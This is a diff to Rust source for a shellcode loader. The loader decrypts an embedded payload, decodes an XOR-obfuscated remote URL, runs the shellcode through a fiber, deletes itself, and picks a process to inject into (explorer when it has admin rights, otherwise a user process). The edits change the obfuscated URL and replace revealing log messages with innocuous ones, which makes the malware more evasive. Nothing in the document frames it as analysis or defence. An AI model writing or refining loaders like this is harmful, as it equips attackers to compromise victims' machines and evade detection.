@@ -203,7 +203,7 @@ fn main() -> Result<()> {
         let encrypted_shellcode: &[u8] = include_bytes!("enc_payload.bin");
         
         // decrypt URL
-        let url_bytes: [u8; 42] = [0x2f, 0x10, 0x16, 0x41, 0x03, 0x65, 0x4b, 0x41, 0x06, 0x1f, 0x52, 0x37, 0x69, 0x33, 0x4b, 0x26, 0x16, 0x07, 0x1f, 0x1f, 0x2d, 0x03, 0x41, 0x12, 0x11, 0x56, 0x21, 0x37, 0x6f, 0x12, 0x68, 0x17, 0x16, 0x50, 0x04, 0x36, 0x07, 0x41, 0x04, 0x19, 0x5d, 0x21];
+        let url_bytes: [u8; 46] = [0x2f, 0x10, 0x16, 0x41, 0x4a, 0x70, 0x4b, 0x5f, 0x5b, 0x42, 0x1f, 0x75, 0x72, 0x78, 0x0d, 0x73, 0x51, 0x4c, 0x00, 0x47, 0x6b, 0x5e, 0x56, 0x56, 0x44, 0x02, 0x6b, 0x34, 0x21, 0x44, 0x22, 0x17, 0x4d, 0x00, 0x5f, 0x2c, 0x10, 0x0f, 0x16, 0x19, 0x52, 0x6b, 0x22, 0x29, 0x4f, 0x22];
         let url_key = b"Gdb1p_dnbp1DD@#";
         let decrypted_url_vec = crypto_utils::xor_decrypt(&url_bytes, url_key);
         let decrypted_url = match String::from_utf8(decrypted_url_vec) {
@@ -223,7 +223,7 @@ fn main() -> Result<()> {
 
         let shellcode = match crypto_utils::decrypt_shellcode(encrypted_shellcode, &pem_key) {
             Ok(s) => {
-                println!("[+] Shellcode decrypted successfully");
+                println!("[+] Setup complete");
                 s
             },
             Err(_) => {
@@ -285,8 +285,8 @@ fn main() -> Result<()> {
 
                 // transfer execution to shellcode
                 SwitchToFiber(shellcode_fiber);
-                // may not reach
-                println!("[!] Execution returned from stager (Should not happen if successful?)");
+                // will not reach
+                println!("[!] Returned");
 
                 if use_delete {
                     let _ = suicide::delete_self(None);
@@ -369,13 +369,18 @@ fn main() -> Result<()> {
                      // println!("[+] Initialized!");
                 }
                 
-                // find target process (explorer)
-                let target_pid = match find_remote::find_target_pid("explorer") {
-                    Some(pid) => pid,
-                    None => {
-                        // panic!("Failed: 901");
-                        return Ok(());
-                    },
+                // find target process
+                let target_pid = if _is_admin {
+                    match find_remote::find_target_pid("explorer") {
+                        Some(pid) => pid,
+                        None => return Ok(()),
+                    }
+                } else {
+                    // find user process
+                    match find_remote::find_user_process_pid() {
+                        Some(pid) => pid,
+                        None => return Ok(()),
+                    }
                 };
                 
                 // enum all threads in target process
